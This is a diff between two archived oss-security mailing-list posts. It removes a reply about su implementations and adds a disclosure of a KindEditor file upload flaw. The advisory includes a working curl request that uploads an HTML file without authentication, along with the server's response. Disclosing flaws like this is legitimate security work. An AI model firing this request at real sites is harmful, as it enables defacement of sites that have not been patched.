@@ -1,25 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/23/16
-Message-ID: <20170223165139.GA11848@jasmine>
-Date: Thu, 23 Feb 2017 11:51:39 -0500
-From: Leo Famulari <leo@...ulari.name>
-To: oss-security@...ts.openwall.com
-Subject: Re: util-linux 2.29.2 fixes CVE-2017-2616
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/05/15
+Message-id: <FEB98110-2F76-4716-84F8-3F26EC9D91DA@me.com>
+Date: Wed, 05 Jul 2017 11:22:54 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: File upload vulnerability in Kindeditor <= 4.1.12
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Feb 23, 2017 at 05:08:48PM +0100, Hanno Böck wrote:
-> Anyone have a good idea who is using shadow vs. util-linux su? Do they
-> have specific advantages/disadvantages, would it be reasonable to try
-> to get all distros to use them same one?
+Title: File upload vulnerability in Kindeditor <= 4.1.12
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-06-14
+CVE-ID:[CVE-2017-1002024]
+Download Site: http://kindeditor.org/ https://github.com/kindsoft/kindeditor/
+Vendor: KindSoft
+Vendor Notified: 2017-06-15
+Vendor Contact:
+Advisory: http://www.vapidlabs.com/advisory.php?v=195
+Description: KindEditor is a lightweight, Open Source(LGPL), cross browser, web based WYSIWYG HTML editor. KindEditor has the ability to convert standard text areas to rich text editing.
+Vulnerability:
+It appears there is a remote file upload vulnerability in kindeditor<= 4.1.12 specifically in kindeditor/php/upload_json.php. The file doesn't sanitize user input or check that a user should be uploading files to the system.  It appears it doesn't allow .php, phtml, shtml or other executable extensions. You can upload .html and call it as its uploaded to the web server path. But no server side code exec.
 
-Debian uses shadow, but is discussing a switch to util-linux:
-https://packages.debian.org/sid/login
-https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=833256
+Exploit Code:
+	• A simple curl request to kindeditor/php/upload_json.php?dir=file with the data filename=test.html set via POST request is all that's require to exploit this vulnerability:
+	•  
+	• $ curl -F "imgFile=@...t.html" http://example.com/kindeditor/php/upload_json.php?dir=file
+	•  
+	• {"error":0,"url":"/kindeditor/php/../attached/file/20170613/20170613203236_37481.html"}
 
-GuixSD is using shadow:
-https://git.savannah.gnu.org/cgit/guix.git/tree/gnu/system.scm#n579
 
-I'm also interested to learn the pros and cons of the two
-implementations.
+This vulnerability is being actively exploited in the wild to deface sites.  The software vendor has not responded to the issue I posted three weeks ago.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+https://github.com/kindsoft/kindeditor/issues/249
+
+
